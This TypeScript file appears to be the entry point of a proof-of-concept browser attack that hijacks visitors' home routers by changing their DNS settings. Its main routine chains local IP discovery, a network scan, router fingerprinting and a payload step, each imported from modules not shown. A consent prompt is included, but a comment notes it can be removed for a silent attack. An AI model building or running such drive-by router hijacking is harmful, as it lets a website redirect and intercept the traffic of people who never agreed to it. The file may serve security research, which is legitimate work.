import {Promise} from "es6-promise";
import IPAddress from "./shared/IPAddress";
import FingerprintResult from "./fingerprint/FingerprintResult";
import doDiscoverDevices from "./discover_devices/index";
import doFingerprint from "./fingerprint/index";
import doPayload from "./payload/index";
import doLocalIp from "./local_ip/index";

/**
 * Returns a Promise resolved when the DOM is ready.
 * @returns {Promise}
 */
function waitForDOMContentLoaded():Promise<any> {
    if (document.readyState === 'complete') {
        return Promise.resolve();
    } else {
        return new Promise((resolve) => {
            document.addEventListener("DOMContentLoaded", resolve)
        });
    }
}

/**
 * Prompts the user before starting the hijacking, as we
 * are doing things that might flag the user if he/she is
 * on an enterprise network (or the user might not want
 * their DNS settings changed :)). Notice that this interaction
 * is not necessary for the attack, and could be removed.
 */
function getUserApproval():Promise<any> {
    return new Promise((resolve) => {
        let infoText = document.createElement('p');
        infoText.innerHTML = ""
            + "<b>NOTICE:</b>"
            + "<br />"
            + "This site will attempt to change the DNS settings of your router."
            + "<br />"
            + " In attempting to doing so, this site will make your browser do,"
            + " among other things, a network scan. This might flag your ip if you"
            + " are on an enterprise network."
            + "<br />"
            + " Click 'OK' below only if you understand the consequences. Otherwise"
            + " close this page.";

        let buttonOk = document.createElement('button');
        buttonOk.innerHTML = 'OK';
        buttonOk.onclick = () => {
            infoText.style.display = 'none';
            buttonOk.style.display = 'none';
            resolve();
        };

        document.body.appendChild(infoText);
        document.body.appendChild(buttonOk);
    });
}

/**
 * Creates some textual grouping output around the provided function.
 * @param groupName Name of the group.
 * @param printFunc A function to be invoked for printing log data
 *                  "inside" the group.
 */
function consoleGroup(groupName:string, printFunc:()=>void) {
    console.log('');
    console.log('#######################');
    console.log(`${groupName}`);
    console.log('-----------------------');
    printFunc();
    console.log('#######################');
    console.log('');
}

function printLocalIp(ips:IPAddress[]):IPAddress[] {
    consoleGroup('Local Ip Results', () => {
        ips.forEach((ip) => {
            console.log(ip.toString())
        });
    });
    return ips;
}

function printDiscoveredDevices(ips:IPAddress[]):IPAddress[] {
    consoleGroup('Discover Results', () => {
        ips.forEach((ip) => {
            console.log(ip.toString())
        });
    });
    return ips;
}

function printFingerprintedDevices(fingerprints:FingerprintResult[]):FingerprintResult[] {
    consoleGroup('Fingerprint Results', () => {
        fingerprints.forEach((fp) => {
            console.log(`${fp.ip} -> ${fp.vendor}:${fp.hwVersion}:${fp.fwVersion}`)
        });
    });
    return fingerprints;
}

/**
 * The main entry point of the script.
 *
 * Runs all the different steps of the attack and outputs
 * debug data between.
 */
(function main() {
    waitForDOMContentLoaded()
        .then(() => getUserApproval())
        .then(() => console.time("execTime"))
        .then(doLocalIp)
        .then(printLocalIp)
        .then(doDiscoverDevices)
        .then(printDiscoveredDevices)
        .then(doFingerprint)
        .then(printFingerprintedDevices)
        .then(doPayload)
        .then(() => console.timeEnd("execTime"))
        .catch((err) => {
            console.error("Error caught in main!");
            console.error(err);
        })
})();
